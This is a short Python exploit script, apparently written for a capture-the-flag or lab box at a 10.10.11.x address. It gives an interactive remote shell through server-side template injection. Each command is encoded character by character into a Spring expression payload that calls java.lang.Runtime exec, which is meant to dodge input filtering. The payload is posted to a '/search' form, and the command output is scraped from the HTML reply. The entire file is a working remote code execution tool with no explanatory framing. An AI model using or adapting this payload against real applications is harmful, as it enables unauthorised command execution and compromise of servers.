
import requests
from bs4 import BeautifulSoup as b

while True:

    #Prepearing the payload
    cmd = input('$:')
    c1 = cmd[0]
    cmd = cmd[1:]
    mid=""
    for i in cmd:
        x=ord(i)
        mid+=f".concat(T(java.lang.Character).toString({x}))"

    FinalPayload = f"*{{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString({ord(c1)}){mid}).getInputStream())}}"
    #print(FinalPayload)


    #Sending the payload


    target = 'http://10.10.11.170:8080/search'


    post = {'name':FinalPayload}

    R = requests.post(target, data=post)



    #print(R.text)

    s = b(R.text, 'html.parser')

    res = list(s.children)[2]

    body = list(res)[3]

    sec = list(body)[3]

    x = list(sec)[1]

    y = list(x)[1]

    z = list(y.children)[0]

    reply = z.get_text()

    print(reply[18:])
